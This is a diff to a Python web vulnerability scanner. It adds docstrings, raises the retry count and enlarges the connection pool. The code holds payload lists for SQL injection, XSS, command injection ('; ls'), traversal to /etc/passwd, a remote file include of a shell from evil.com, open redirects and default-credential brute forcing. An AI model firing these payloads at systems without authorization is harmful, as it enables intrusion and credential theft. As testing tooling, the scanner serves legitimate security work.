@@ -20,7 +20,7 @@ logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s -
 REQUEST_TIMEOUT = 100  # seconds
 
 # Define maximum retries
-MAX_RETRIES = 3
+MAX_RETRIES = 10
 
 # Define User-Agent header
 HEADERS = {
@@ -30,12 +30,13 @@ HEADERS = {
 # Session management to reuse connections
 session = requests.Session()
 session.headers.update(HEADERS)
-session.mount('http://', requests.adapters.HTTPAdapter(pool_maxsize=1000))
-session.mount('https://', requests.adapters.HTTPAdapter(pool_maxsize=1000))
+session.mount('http://', requests.adapters.HTTPAdapter(pool_maxsize=5000))
+session.mount('https://', requests.adapters.HTTPAdapter(pool_maxsize=5000))
 
 # Retry strategy
 @retry(stop_max_attempt_number=MAX_RETRIES, wait_exponential_multiplier=1000, wait_exponential_max=10000)
 def request_with_retry(method, url, **kwargs):
+    """Make a request with retry logic."""
     return session.request(method, url, timeout=REQUEST_TIMEOUT, verify=certifi.where(), **kwargs)
 
 def looks_like_html(content):
@@ -43,6 +44,7 @@ def looks_like_html(content):
     return '<html' in content.lower() and '</html>' in content.lower()
 
 def run_tests(url, links):
+    """Run various security tests on the provided URL and links."""
     vulnerabilities = []
     with ThreadPoolExecutor(max_workers=12) as executor:
         futures = [
@@ -69,18 +71,22 @@ def run_tests(url, links):
     return vulnerabilities
 
 def test_sql_injection(url, links):
+    """Test for SQL injection vulnerabilities."""
     sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "' OR '1'='1"]
     return test_injection(url, links, sql_payloads, "sql")
 
 def test_xss_injection(url, links):
+    """Test for XSS injection vulnerabilities."""
     xss_payloads = ["<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"]
     return test_injection(url, links, xss_payloads, "xss")
 
 def test_command_injection(url, links):
+    """Test for command injection vulnerabilities."""
     command_payloads = ["; ls", "&& ls", "| ls"]
     return test_injection(url, links, command_payloads, "command")
 
 def test_brute_force(url):
+    """Test for brute force vulnerabilities."""
     brute_force_payloads = [("admin", "admin"), ("admin", "password"), ("user", "123456")]
     vulnerabilities = []
 
@@ -122,38 +128,47 @@ def test_brute_force(url):
     return vulnerabilities
 
 def test_directory_traversal(url, links):
+    """Test for directory traversal vulnerabilities."""
     traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
     return test_injection(url, links, traversal_payloads, "traversal")
 
 def test_rfi(url, links):
+    """Test for remote file inclusion vulnerabilities."""
     rfi_payloads = ["http://evil.com/shell.txt"]
     return test_injection(url, links, rfi_payloads, "rfi")
 
 def test_lfi(url, links):
+    """Test for local file inclusion vulnerabilities."""
     lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
     return test_injection(url, links, lfi_payloads, "lfi")
 
 def test_idor(url, links):
+    """Test for insecure direct object references vulnerabilities."""
     idor_payloads = ["?user_id=1", "?account_id=1"]
     return test_injection(url, links, idor_payloads, "idor")
 
 def test_csrf(url, links):
+    """Test for cross-site request forgery vulnerabilities."""
     csrf_payloads = ["<form action='{}' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form>".format(url)]
     return test_injection(url, links, csrf_payloads, "csrf")
 
 def test_open_redirect(url, links):
+    """Test for open redirect vulnerabilities."""
     open_redirect_payloads = ["http://evil.com"]
     return test_injection(url, links, open_redirect_payloads, "open_redirect")
 
 def test_security_misconfiguration(url, links):
+    """Test for security misconfiguration vulnerabilities."""
     misconfiguration_payloads = ["/.git", "/.env", "/config.php"]
     return test_injection(url, links, misconfiguration_payloads, "security_misconfiguration")
 
 def test_sensitive_data_exposure(url, links):
+    """Test for sensitive data exposure vulnerabilities."""
     sensitive_data_payloads = ["/backup.sql", "/database.sql", "/dump.sql"]
     return test_injection(url, links, sensitive_data_payloads, "sensitive_data_exposure")
 
 def test_injection(url, links, payloads, test_type):
+    """Test for various injection vulnerabilities."""
     vulnerabilities = []
 
     with ThreadPoolExecutor(max_workers=10) as executor:
@@ -173,6 +188,7 @@ def test_injection(url, links, payloads, test_type):
     return vulnerabilities
 
 def test_payload(url, link, payload, test_type):
+    """Test a specific payload for vulnerabilities."""
     parsed_url = urlparse(link)
     query_params = parse_qs(parsed_url.query)
     base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
